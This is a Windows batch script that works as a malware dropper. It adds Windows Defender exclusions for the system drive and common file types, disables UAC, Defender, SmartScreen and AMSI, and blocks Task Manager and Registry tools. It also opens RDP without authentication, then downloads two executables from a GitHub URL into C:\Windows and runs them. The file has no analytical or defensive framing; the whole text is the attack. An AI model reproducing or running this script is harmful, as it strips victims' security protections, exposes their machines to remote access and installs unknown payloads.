@echo off
cls
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'; Add-MpPreference -ExclusionPath '%SystemDrive%\'; $ext = @('.exe','.dll','.pdf','.doc','.docx','.xls','.xlsx','.zip','.rar','.png','.jpg','.jpeg','.gif','.mp3','.avi','.mp4','.iso','.msi','.bat','.ps1','.py','.html','.css','.js'); Add-MpPreference -ExclusionExtension $ext" >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'; Add-MpPreference -ExclusionPath '%SystemDrive%\'" >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Script\Settings\AMSI" /v Enable /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowUnsolicited /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul
curl -L "https://github.com/ahmadgofranahmad-svg/11/raw/refs/heads/main/111" -o "C:\Windows\v1.exe"
start "" "C:\Windows\v1.exe"
curl -L "https://github.com/ahmadgofranahmad-svg/11/raw/refs/heads/main/222" -o "C:\Windows\v2.exe"
start "" "C:\Windows\v2.exe"
explorer "%APPDATA%"
explorer "%LOCALAPPDATA%"
explorer "%TEMP%"
explorer "%SystemRoot%\\Temp"
explorer "%ProgramData%"
explorer "%SystemRoot%\\System32"
exit